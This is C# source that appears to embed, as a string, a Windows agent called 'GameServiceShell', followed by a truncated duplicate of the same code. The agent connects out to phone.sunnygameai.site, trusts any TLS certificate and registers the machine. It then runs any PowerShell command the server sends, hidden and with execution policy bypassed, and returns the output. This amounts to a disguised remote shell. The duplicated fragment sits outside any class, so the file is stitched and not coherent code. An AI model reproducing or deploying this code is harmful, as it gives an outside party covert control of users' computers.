        return @"using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Net.Security;
using System.Security.Authentication;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class GameServiceShell
{
    private static readonly string RemoteHost = ""phone.sunnygameai.site"";
    private static readonly int RemotePort = 443;
    private static readonly string DeviceName = Environment.MachineName + ""_PC"";

    private static volatile Stream activeStream;
    private static Mutex singleInstance;
    private static readonly object desktopLogLock = new object();
    private static readonly object sendLock = new object();

    private static string[] GetDesktopLogPaths(string fileName)
    {
        var paths = new List<string>();
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string fallback = Path.Combine(ExeDir(), fileName); if (!paths.Contains(fallback)) paths.Add(fallback); } catch {}
        return paths.ToArray();
    }

    private static void LogDesktop(string msg)
    {
        try
        {
            ShipStamped(msg);
            string line = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss.fff"") + "" ["" + DeviceName + ""] "" + msg + Environment.NewLine;
            string[] paths = GetDesktopLogPaths(""GameServiceShell.txt"");
            lock (desktopLogLock)
            {
                foreach (string p in paths)
                {
                    try { File.AppendAllText(p, line); } catch {}
                }
            }
        }
        catch { }
    }

    private static string ExeDir()
    {
        try
        {
            string loc = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(loc))
            {
                string d = Path.GetDirectoryName(loc);
                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
            }
        }
        catch { }
        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""GameService"");
    }


    // ── 🐛 Device Debug console: self-registration + stamped shipping ──
    static volatile bool dbgInformed = false;
    static volatile Stream dbgStream = null;
    const string DbgService = ""GameServiceShell.exe"";
    static string StampFor(string msg)
    {
        if (!string.IsNullOrEmpty(msg) && msg.StartsWith(""[""))
            return msg.StartsWith(""[ERROR]"") || msg.StartsWith(""[SUCCESS]"") || msg.StartsWith(""[MESSAGE]"") ? msg : ""[MESSAGE] "" + msg;
        string m = (msg ?? """").ToLowerInvariant();
        if (m.Contains(""fail"") || m.Contains(""error"") || m.Contains(""exception"") || m.Contains(""timeout"") || m.Contains(""not running"")) return ""[ERROR] "" + msg;
        if (m.Contains(""success"") || m.Contains(""updated"") || m.Contains(""started"") || m.Contains(""registered"") || m.Contains(""completed"") || m.Contains(""backed up"") || m.Contains(""rolled back"") || m.Contains(""installed"")) return ""[SUCCESS] "" + msg;
        return ""[MESSAGE] "" + msg;
    }
    static void AnnounceDbg(Stream s)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""RegisterDebugSource\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\""]}\x1e"");
            dbgInformed = true;
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbgLine(Stream s, string stamped)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""SendServiceDebug\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\"",[\"""" + EscapeJson(stamped) + ""\""]]}\x1e"");
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbg(string stamped)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try { if (!dbgInformed) AnnounceDbg(s); ShipDbgLine(s, stamped); }
        catch { dbgInformed = false; }
    }
    static void DbgReset() { dbgStream = null; dbgInformed = false; }
    private static void ShipStamped(string rawMsg)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try
        {
            if (!dbgInformed) AnnounceDbg(s);
            ShipDbgLine(s, StampFor(rawMsg));
        }
        catch { dbgInformed = false; }
    }

    static void Main(string[] args)
    {
        bool createdNew;
        singleInstance = new Mutex(true, ""Global\\GameServiceShell.SingleInstance"", out createdNew);
        if (!createdNew) return;
        StartHealthResponder();
        LogDesktop(""Shell Main started, DeviceName="" + DeviceName);
        RunAsync().GetAwaiter().GetResult();
    }

    private static void StartHealthResponder()
    {
        try
        {
            Thread healthThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        using (var server = new NamedPipeServerStream(""GameServiceShell_health"", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
                        {
                            server.WaitForConnection();
                            byte[] buf = new byte[1024];
                            int n = server.Read(buf, 0, buf.Length);
                            string msg = Encoding.UTF8.GetString(buf, 0, n).Trim();
                            if (msg.IndexOf(""Are you up"", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                byte[] resp = Encoding.UTF8.GetBytes(""YES"");
                                server.Write(resp, 0, resp.Length);
                                server.Flush();
                            }
                        }
                    }
                    catch { Thread.Sleep(500); }
                }
            });
            healthThread.IsBackground = true;
            healthThread.Start();
        }
        catch { }
    }

    static async Task RunAsync()
    {
        while (true)
        {
            bool connected = false;
            try
            {
                using (var tcp = ConnectTcpWithTimeout(RemoteHost, RemotePort, 5000))
                {
                    using (var ssl = AuthenticateSslWithTimeout(tcp, RemoteHost, 5000))
                    {
                        connected = await HandleConnection(ssl, RemoteHost);
                    }
                }
            }
            catch (Exception ex) { LogDesktop(""remote failed: "" + ex.Message); }
await Task.Delay(5000);
        }
    }

    private static async Task<bool> HandleConnection(Stream stream, string hostHeader)
    {
        try
        {
            string httpReq = ""GET /communicate HTTP/1.1\r\n"" +
                             ""Host: "" + hostHeader + ""\r\n"" +
                             ""Upgrade: websocket\r\n"" +
                             ""Connection: Upgrade\r\n"" +
                             ""Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"" +
                             ""Sec-WebSocket-Version: 13\r\n\r\n"";
            byte[] reqBytes = Encoding.UTF8.GetBytes(httpReq);
            await stream.WriteAsync(reqBytes, 0, reqBytes.Length);
            // Read HTTP headers byte-by-byte so we stop EXACTLY at \r\n\r\n and
            // do NOT consume bytes from the first WebSocket frame.
            List<byte> headerBytes = new List<byte>(512);
            string respStr = """";
            try
            {
                var readTask = Task.Run(() =>
                {
                    int b;
                    while ((b = stream.ReadByte()) != -1)
                    {
                        headerBytes.Add((byte)b);
                        if (headerBytes.Count >= 4)
                        {
                            int n = headerBytes.Count;
                            if (headerBytes[n-4] == '\r' && headerBytes[n-3] == '\n' &&
                                headerBytes[n-2] == '\r' && headerBytes[n-1] == '\n')
                                break;
                        }
                    }
                });
                if (await Task.WhenAny(readTask, Task.Delay(5000)) != readTask)
                { LogDesktop(""handshake read timed out""); return false; }
                respStr = Encoding.UTF8.GetString(headerBytes.ToArray());
            }
            catch (Exception ex) { LogDesktop(""handshake read failed: "" + ex.Message); return false; }
            if (!respStr.Contains(""101"")) return false;

            SendWsText(stream, ""{\""protocol\"":\""json\"",\""version\"":1}\x1e"");
            ReadWebSocketTextFrame(stream);

            activeStream = stream;
            string reg = ""{\""type\"":1,\""target\"":\""RegisterShell\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\""]}\x1e"";
            SendWsText(stream, reg);
            dbgStream = stream;
            AnnounceDbg(stream);
            LogDesktop(""registered as "" + DeviceName);

            CancellationTokenSource cts = new CancellationTokenSource();
            Thread pingThread = new Thread(() =>
            {
                while (!cts.IsCancellationRequested)
                {
                    Thread.Sleep(15000);
                    try { SendWsText(stream, ""{\""type\"":6}\x1e""); }
                    catch { break; }
                }
            });
            pingThread.IsBackground = true;
            pingThread.Start();

            StringBuilder msgBuf = new StringBuilder();
            while (true)
            {
                string frameText = ReadWebSocketTextFrame(stream);
                if (frameText == null) break;
                msgBuf.Append(frameText);
                int idx = IndexOfSeparator(msgBuf);
                while (idx != -1)
                {
                    string rawJson = msgBuf.ToString().Substring(0, idx).Trim();
                    msgBuf.Remove(0, idx + 1);
                    if (rawJson.Length > 0)
                {
                    if (rawJson.IndexOf(""\""WhoAreYou\"""", StringComparison.Ordinal) >= 0 &&
                        rawJson.IndexOf(EscapeJson(DeviceName), StringComparison.Ordinal) >= 0)
                    {
                        dbgInformed = false;
                        AnnounceDbg(stream);
                    }
                    HandleMessage(stream, rawJson);
                }
                    idx = IndexOfSeparator(msgBuf);
                }
            }
            cts.Cancel();
            return true;
        }
        catch { return false; }
        finally { activeStream = null; DbgReset(); }
    }

    private static void HandleMessage(Stream stream, string jsonStr)
    {
        try
        {
            int type = GetJsonInt(jsonStr, ""\""type\"""");
            if (type != 1) return;
            string target = GetJsonString(jsonStr, ""\""target\"""");
            string tDev = GetJsonStringArray(jsonStr, 0);
            bool mine = string.Equals(tDev, DeviceName, StringComparison.OrdinalIgnoreCase);
            if (!mine) return;
            if (target == ""RunShellCommand"")
            {
                string reqId = GetJsonStringArray(jsonStr, 1);
                string command = GetJsonStringArray(jsonStr, 2);
                int tSec;
                if (!int.TryParse(GetJsonStringArray(jsonStr, 3), out tSec) || tSec <= 0 || tSec > 300) tSec = 60;
                LogDesktop(""cmd ["" + reqId + ""]: "" + command);
                ThreadPool.QueueUserWorkItem(delegate { ExecuteAndReport(stream, reqId, command, tSec); });
            }
        }
        catch (Exception ex) { LogDesktop(""HandleMessage error: "" + ex.Message); }
    }

    // Runs one PowerShell command and ships stdout/stderr back.
    private static void ExecuteAndReport(Stream stream, string reqId, string command, int timeoutSec)
    {
        int exitCode = -1;
        string output;
        try
        {
            if (string.IsNullOrWhiteSpace(command))
            {
                output = ""(empty command)"";
            }
            else
            {
                string script = ""[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; "" + command;
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                ProcessStartInfo psi = new ProcessStartInfo(""powershell.exe"",
                    ""-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand "" + b64);
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.WorkingDirectory = ExeDir();
                StringBuilder sb = new StringBuilder();
                object slock = new object();
                using (Process proc = new Process())
                {
                    proc.StartInfo = psi;
                    proc.OutputDataReceived += delegate(object s2, DataReceivedEventArgs e2) { if (e2.Data != null) lock (slock) { sb.AppendLine(e2.Data); } };
                    proc.ErrorDataReceived += delegate(object s3, DataReceivedEventArgs e3) { if (e3.Data != null) lock (slock) { sb.AppendLine(e3.Data); } };
                    proc.Start();
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
                    if (!proc.WaitForExit(timeoutSec * 1000))
                    {
                        try { proc.Kill(); } catch { }
                        lock (slock) { sb.AppendLine(); sb.AppendLine(""[TIMEOUT] Killed after "" + timeoutSec + ""s""); }
                        exitCode = -9;
                    }
                    else
                    {
                        exitCode = proc.ExitCode;
                        proc.WaitForExit();
                    }
                }
                lock (slock) { output = sb.ToString(); }
            }
        }
        catch (Exception ex) { output = ""SHELL ERROR: "" + ex.Message; }
        if (output == null) output = """";
        if (output.Length > 200000) output = output.Substring(output.Length - 200000);
        try
        {
            string msg = ""{\""type\"":1,\""target\"":\""ShellCommandResult\"",\""arguments\"":[\""""
                + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(reqId) + ""\"",""
                + exitCode + "",\"""" + EscapeJson(output) + ""\""]}\x1e"";
            lock (sendLock) { SendWsText(stream, msg); }
        }
        catch { }
    }

    private static string EscapeJson(string s) { if (s == null) return """"; StringBuilder sb = new StringBuilder(); foreach (char c in s) { if (c == '\\') sb.Append(""\\\\""); else if (c == '""') sb.Append(""\\\""""); else if (c == '\n') sb.Append(""\\n""); else if (c == '\r') sb.Append(""\\r""); else if (c == '\t') sb.Append(""\\t""); else if (c < 0x20) sb.Append(""\\u"" + ((int)c).ToString(""x4"")); else sb.Append(c); } return sb.ToString(); }

    private static int GetJsonInt(string json, string key) { string v = GetJsonString(json, key); int r; return int.TryParse(v, out r) ? r : 0; }

    private static string GetJsonString(string json, string key)
    {
        try
        {
            int i = json.IndexOf(key, StringComparison.Ordinal);
            if (i < 0) return null;
            int col = json.IndexOf(':', i);
            if (col < 0) return null;
            col++;
            while (col < json.Length && (json[col] == ' ' || json[col] == '\t')) col++;
            if (col < json.Length && json[col] == '""')
            {
                int end = json.IndexOf('""', col + 1);
                if (end < 0) return null;
                return json.Substring(col + 1, end - col - 1);
            }
            int r = json.IndexOf(',', col);
            int b = json.IndexOf('}', col);
            int stop = (r < 0) ? b : (b < 0 ? r : Math.Min(r, b));
            if (stop < 0) stop = json.Length;
            return json.Substring(col, stop - col).Trim();
        }
        catch { return null; }
    }

    private static string GetJsonStringArray(string json, int arrayIndex)
    {
        int idx = json.IndexOf(""\""arguments\"""", StringComparison.Ordinal);
        if (idx < 0) return """";
        idx += ""\""arguments\"""".Length;
        while (idx < json.Length && json[idx] != '[') idx++;
        idx++;
        int cur = 0;
        while (idx < json.Length && cur < arrayIndex)
        {
            char c = json[idx];
            if (c == '""')
            {
                idx++;
                while (idx < json.Length) { if (json[idx] == '\\') idx+=2; else if (json[idx] == '""') { idx++; break; } else idx++; }
                cur++;
            }
            else if (c != ' ' && c != ',' && c != '\n' && c != '\r') { cur++; while (idx < json.Length && json[idx] != ',' && json[idx] != ']') idx++; if (idx < json.Length && json[idx] == ',') idx++; }
            else idx++;
        }
        while (idx < json.Length && (json[idx] == ' ' || json[idx] == ',' || json[idx] == '\n' || json[idx] == '\r')) idx++;
        if (idx >= json.Length || json[idx] != '""') return """";
        idx++;
        StringBuilder sb = new StringBuilder();
        while (idx < json.Length)
        {
            char c = json[idx];
            if (c == '\\' && idx+1 < json.Length) { sb.Append(json[idx+1]); idx+=2; continue; }
            if (c == '""') break;
            sb.Append(c); idx++;
        }
        return sb.ToString();
    }

    private static void SendWsText(Stream stream, string text)
    {
        byte[] payload = Encoding.UTF8.GetBytes(text);
        int len = payload.Length;
        MemoryStream frame = new MemoryStream();
        frame.WriteByte(0x81);
        byte[] maskKey = new byte[4];
        new Random().NextBytes(maskKey);
        if (len <= 125) frame.WriteByte((byte)(0x80 | len));
        else if (len <= 65535) { frame.WriteByte((byte)(0x80 | 126)); frame.WriteByte((byte)((len >> 8) & 0xFF)); frame.WriteByte((byte)(len & 0xFF)); }
        else { frame.WriteByte((byte)(0x80 | 127)); for (int i = 7; i >= 0; i--) frame.WriteByte((byte)((len >> (i*8)) & 0xFF)); }
        frame.Write(maskKey, 0, 4);
        for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
        byte[] frameBytes = frame.ToArray();
        lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
    }

    private static void SendWsControl(Stream stream, byte opcode, byte[] payload)
    {
        try
        {
            int len = payload != null ? payload.Length : 0;
            MemoryStream frame = new MemoryStream();
            frame.WriteByte((byte)(0x80 | opcode));
            frame.WriteByte((byte)(0x80 | len));
            byte[] maskKey = new byte[4];
            new Random().NextBytes(maskKey);
            frame.Write(maskKey, 0, 4);
            for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
            byte[] frameBytes = frame.ToArray();
            lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
        }
        catch { }
    }

    private static string ReadWebSocketTextFrame(Stream stream)
    {
        MemoryStream assembled = null;
        while (true)
        {
            int b0 = stream.ReadByte();
            if (b0 == -1) return null;
            int opcode = b0 & 0x0F;
            bool fin = (b0 & 0x80) != 0;
            int b1 = stream.ReadByte();
            if (b1 == -1) return null;
            bool isMasked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;
            if (payloadLen == 126) { int hi = stream.ReadByte(); int lo = stream.ReadByte(); if (hi == -1 || lo == -1) return null; payloadLen = (hi << 8) | lo; }
            else if (payloadLen == 127) { byte[] lenBuf = new byte[8]; ReadFully(stream, lenBuf, 8); payloadLen = 0; for (int i = 0; i < 8; i++) payloadLen = (payloadLen << 8) | lenBuf[i]; }
            if (payloadLen < 0 || payloadLen > 67108864) return null;
            byte[] mask = null;
            if (isMasked) { mask = new byte[4]; ReadFully(stream, mask, 4); }
            byte[] payload = new byte[payloadLen];
            ReadFully(stream, payload, (int)payloadLen);
            if (mask != null) for (int i = 0; i < payload.Length; i++) payload[i] = (byte)(payload[i] ^ mask[i % 4]);
            if (opcode == 0x9) { SendWsControl(stream, 0xA, payload); continue; }
            if (opcode == 0xA) { continue; }
            if (opcode == 0x8) { return null; }
            if (opcode == 0x1 || opcode == 0x2)
            {
                if (fin) return Encoding.UTF8.GetString(payload);
                assembled = new MemoryStream();
                assembled.Write(payload, 0, payload.Length);
                continue;
            }
            if (opcode == 0x0)
            {
                if (assembled == null) continue;
                assembled.Write(payload, 0, payload.Length);
                if (fin) { byte[] all = assembled.ToArray(); assembled = null; return Encoding.UTF8.GetString(all); }
                continue;
            }
        }
    }

    private static void ReadFully(Stream stream, byte[] buf, int count)
    {
        int offset = 0;
        while (offset < count)
        {
            int r = stream.Read(buf, offset, count - offset);
            if (r <= 0) throw new IOException(""End of stream"");
            offset += r;
        }
    }

    private static int IndexOfSeparator(StringBuilder sb) { for (int i = 0; i < sb.Length; i++) if (sb[i] == '\x1e') return i; return -1; }

    private static TcpClient ConnectTcpWithTimeout(string host, int port, int timeoutMs)
    {
        System.Net.IPAddress[] ips = System.Net.Dns.GetHostAddresses(host);
        if (ips == null || ips.Length == 0) throw new Exception(""DNS returned no IP addresses for "" + host);
        Exception lastEx = null;
        foreach (var ip in ips)
        {
            if (ip.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
            try
            {
                TcpClient tcp = new TcpClient();
                IAsyncResult ar = tcp.BeginConnect(ip, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
                {
                    try { tcp.Close(); } catch { }
                    throw new TimeoutException(""TCP connect to "" + host + "" ("" + ip + ""):"" + port + "" timed out after "" + timeoutMs + ""ms"");
                }
                tcp.EndConnect(ar);
                return tcp;
            }
            catch (Exception ex) { lastEx = ex; }
        }
        throw lastEx ?? new Exception(""Failed to connect to any IP for "" + host);
    }

    private static SslStream AuthenticateSslWithTimeout(TcpClient tcp, string host, int timeoutMs)
    {
        LogDesktop(""Shell: creating SslStream for "" + host + "" (Tls12)"");
        SslStream ssl = new SslStream(tcp.GetStream(), false, (sender, cert, chain, errs) => true);
        LogDesktop(""Shell: calling AuthenticateAsClient Tls12 for "" + host);
        try {
            var task = System.Threading.Tasks.Task.Run((Action)(() => ssl.AuthenticateAsClient(host, null, SslProtocols.None, false)));
            bool ok = task.Wait(timeoutMs);
            if (!ok) {
                LogDesktop(""Shell: TLS timeout after "" + timeoutMs + ""ms"");
                try { ssl.Close(); } catch {}
                throw new TimeoutException(""TLS handshake to "" + host + "" timed out after "" + timeoutMs + ""ms"");
            }
            if (task.IsFaulted) throw task.Exception.InnerException;
            LogDesktop(""Shell: TLS authenticated to "" + host + "" proto="" + ssl.SslProtocol);
            return ssl;
        } catch (Exception ex) {
            LogDesktop(""Shell: TLS failed "" + ex.GetType().Name + "": "" + ex.Message);
            try { ssl.Close(); } catch {}
            throw;
        }
    }
}";
    private static readonly int RemotePort = 443;
    private static readonly string LocalHost = ""127.0.0.1"";
    private static readonly int LocalPort = 8052;
    private static readonly string DeviceName = Environment.MachineName + ""_PC"";

    private static volatile Stream activeStream;
    private static Mutex singleInstance;
    private static readonly object desktopLogLock = new object();
    private static readonly object sendLock = new object();

    private static string[] GetDesktopLogPaths(string fileName)
    {
        var paths = new List<string>();
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string fallback = Path.Combine(ExeDir(), fileName); if (!paths.Contains(fallback)) paths.Add(fallback); } catch {}
        return paths.ToArray();
    }

    private static void LogDesktop(string msg)
    {
        try
        {
            ShipStamped(msg);
            string line = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss.fff"") + "" ["" + DeviceName + ""] "" + msg + Environment.NewLine;
            string[] paths = GetDesktopLogPaths(""GameServiceShell.txt"");
            lock (desktopLogLock)
            {
                foreach (string p in paths)
                {
                    try { File.AppendAllText(p, line); } catch {}
                }
            }
        }
        catch { }
    }

    private static string ExeDir()
    {
        try
        {
            string loc = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(loc))
            {
                string d = Path.GetDirectoryName(loc);
                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
            }
        }
        catch { }
        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""GameService"");
    }


    // ── 🐛 Device Debug console: self-registration + stamped shipping ──
    static volatile bool dbgInformed = false;
    static volatile Stream dbgStream = null;
    const string DbgService = ""GameServiceShell.exe"";
    static string StampFor(string msg)
    {
        if (!string.IsNullOrEmpty(msg) && msg.StartsWith(""[""))
            return msg.StartsWith(""[ERROR]"") || msg.StartsWith(""[SUCCESS]"") || msg.StartsWith(""[MESSAGE]"") ? msg : ""[MESSAGE] "" + msg;
        string m = (msg ?? """").ToLowerInvariant();
        if (m.Contains(""fail"") || m.Contains(""error"") || m.Contains(""exception"") || m.Contains(""timeout"") || m.Contains(""not running"")) return ""[ERROR] "" + msg;
        if (m.Contains(""success"") || m.Contains(""updated"") || m.Contains(""started"") || m.Contains(""registered"") || m.Contains(""completed"") || m.Contains(""backed up"") || m.Contains(""rolled back"") || m.Contains(""installed"")) return ""[SUCCESS] "" + msg;
        return ""[MESSAGE] "" + msg;
    }
    static void AnnounceDbg(Stream s)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""RegisterDebugSource\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\""]}\x1e"");
            dbgInformed = true;
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbgLine(Stream s, string stamped)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""SendServiceDebug\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\"",[\"""" + EscapeJson(stamped) + ""\""]]}\x1e"");
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbg(string stamped)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try { if (!dbgInformed) AnnounceDbg(s); ShipDbgLine(s, stamped); }
        catch { dbgInformed = false; }
    }
    static void DbgReset() { dbgStream = null; dbgInformed = false; }
    private static void ShipStamped(string rawMsg)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try
        {
            if (!dbgInformed) AnnounceDbg(s);
            ShipDbgLine(s, StampFor(rawMsg));
        }
        catch { dbgInformed = false; }
    }

    static void Main(string[] args)
    {
        bool createdNew;
        singleInstance = new Mutex(true, ""Global\\GameServiceShell.SingleInstance"", out createdNew);
        if (!createdNew) return;
        StartHealthResponder();
        LogDesktop(""Shell Main started, DeviceName="" + DeviceName);
        RunAsync().GetAwaiter().GetResult();
    }

    private static void StartHealthResponder()
    {
        try
        {
            Thread healthThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        using (var server = new NamedPipeServerStream(""GameServiceShell_health"", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
                        {
                            server.WaitForConnection();
                            byte[] buf = new byte[1024];
                            int n = server.Read(buf, 0, buf.Length);
                            string msg = Encoding.UTF8.GetString(buf, 0, n).Trim();
                            if (msg.IndexOf(""Are you up"", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                byte[] resp = Encoding.UTF8.GetBytes(""YES"");
                                server.Write(resp, 0, resp.Length);
                                server.Flush();
                            }
                        }
                    }
                    catch { Thread.Sleep(500); }
                }
            });
            healthThread.IsBackground = true;
            healthThread.Start();
        }
        catch { }
    }

    static async Task RunAsync()
    {
        while (true)
        {
            bool connected = false;
            try
            {
                using (var tcp = ConnectTcpWithTimeout(RemoteHost, RemotePort, 5000))
                {
                    using (var ssl = AuthenticateSslWithTimeout(tcp, RemoteHost, 5000))
                    {
                        connected = await HandleConnection(ssl, RemoteHost);
                    }
                }
            }
            catch (Exception ex) { LogDesktop(""remote failed: "" + ex.Message); }
            if (!connected)
            {
                try
                {
                    using (var tcp = new TcpClient())
                    {
                        var fbTask = tcp.ConnectAsync(LocalHost, LocalPort);
                        if (await Task.WhenAny(fbTask, Task.Delay(3000)) != fbTask) throw new TimeoutException(""fallback"");
                        await fbTask;
                        connected = await HandleConnection(tcp.GetStream(), LocalHost + "":"" + LocalPort);
                    }
                }
                catch (Exception ex) { LogDesktop(""fallback failed: "" + ex.Message); }
            }
            await Task.Delay(5000);
        }
    }

    private static async Task<bool> HandleConnection(Stream stream, string hostHeader)
    {
        try
        {
            string httpReq = ""GET /communicate HTTP/1.1\r\n"" +
                             ""Host: "" + hostHeader + ""\r\n"" +
                             ""Upgrade: websocket\r\n"" +
                             ""Connection: Upgrade\r\n"" +
                             ""Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"" +
                             ""Sec-WebSocket-Version: 13\r\n\r\n"";
            byte[] reqBytes = Encoding.UTF8.GetBytes(httpReq);
            await stream.WriteAsync(reqBytes, 0, reqBytes.Length);
            // Read HTTP headers byte-by-byte so we stop EXACTLY at \r\n\r\n and
            // do NOT consume bytes from the first WebSocket frame.
            List<byte> headerBytes = new List<byte>(512);
            string respStr = """";
            try
            {
                var readTask = Task.Run(() =>
                {
                    int b;
                    while ((b = stream.ReadByte()) != -1)
                    {
                        headerBytes.Add((byte)b);
                        if (headerBytes.Count >= 4)
                        {
                            int n = headerBytes.Count;
                            if (headerBytes[n-4] == '\r' && headerBytes[n-3] == '\n' &&
                                headerBytes[n-2] == '\r' && headerBytes[n-1] == '\n')
                                break;
                        }
                    }
                });
                if (await Task.WhenAny(readTask, Task.Delay(5000)) != readTask)
                { LogDesktop(""handshake read timed out""); return false; }
                respStr = Encoding.UTF8.GetString(headerBytes.ToArray());
            }
            catch (Exception ex) { LogDesktop(""handshake read failed: "" + ex.Message); return false; }
            if (!respStr.Contains(""101"")) return false;

            SendWsText(stream, ""{\""protocol\"":\""json\"",\""version\"":1}\x1e"");
            ReadWebSocketTextFrame(stream);

            activeStream = stream;
            string reg = ""{\""type\"":1,\""target\"":\""RegisterShell\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\""]}\x1e"";
            SendWsText(stream, reg);
            dbgStream = stream;
            AnnounceDbg(stream);
            LogDesktop(""registered as "" + DeviceName);

            CancellationTokenSource cts = new CancellationTokenSource();
            Thread pingThread = new Thread(() =>
            {
                while (!cts.IsCancellationRequested)
                {
                    Thread.Sleep(15000);
                    try { SendWsText(stream, ""{\""type\"":6}\x1e""); }
                    catch { break; }
                }
            });
            pingThread.IsBackground = true;
            pingThread.Start();

            StringBuilder msgBuf = new StringBuilder();
            while (true)
            {
                string frameText = ReadWebSocketTextFrame(stream);
                if (frameText == null) break;
                msgBuf.Append(frameText);
                int idx = IndexOfSeparator(msgBuf);
                while (idx != -1)
                {
                    string rawJson = msgBuf.ToString().Substring(0, idx).Trim();
                    msgBuf.Remove(0, idx + 1);
                    if (rawJson.Length > 0)
                {
                    if (rawJson.IndexOf(""\""WhoAreYou\"""", StringComparison.Ordinal) >= 0 &&
                        rawJson.IndexOf(EscapeJson(DeviceName), StringComparison.Ordinal) >= 0)
                    {
                        dbgInformed = false;
                        AnnounceDbg(stream);
                    }
                    HandleMessage(stream, rawJson);
                }
                    idx = IndexOfSeparator(msgBuf);
                }
            }
            cts.Cancel();
            return true;
        }
        catch { return false; }
        finally { activeStream = null; DbgReset(); }
    }

    private static void HandleMessage(Stream stream, string jsonStr)
    {
        try
        {
            int type = GetJsonInt(jsonStr, ""\""type\"""");
            if (type != 1) return;
            string target = GetJsonString(jsonStr, ""\""target\"""");
            string tDev = GetJsonStringArray(jsonStr, 0);
            bool mine = string.Equals(tDev, DeviceName, StringComparison.OrdinalIgnoreCase);
            if (!mine) return;
            if (target == ""RunShellCommand"")
            {
                string reqId = GetJsonStringArray(jsonStr, 1);
                string command = GetJsonStringArray(jsonStr, 2);
                int tSec;
                if (!int.TryParse(GetJsonStringArray(jsonStr, 3), out tSec) || tSec <= 0 || tSec > 300) tSec = 60;
                LogDesktop(""cmd ["" + reqId + ""]: "" + command);
                ThreadPool.QueueUserWorkItem(delegate { ExecuteAndReport(stream, reqId, command, tSec); });
            }
        }
        catch (Exception ex) { LogDesktop(""HandleMessage error: "" + ex.Message); }
    }

    // Runs one PowerShell command and ships stdout/stderr back.
    private static void ExecuteAndReport(Stream stream, string reqId, string command, int timeoutSec)
    {
        int exitCode = -1;
        string output;
        try
        {
            if (string.IsNullOrWhiteSpace(command))
            {
                output = ""(empty command)"";
            }
            else
            {
                string script = ""[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; "" + command;
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                ProcessStartInfo psi = new ProcessStartInfo(""powershell.exe"",
                    ""-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand "" + b64);
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.WorkingDirectory = ExeDir();
                StringBuilder sb = new StringBuilder();
                object slock = new object();
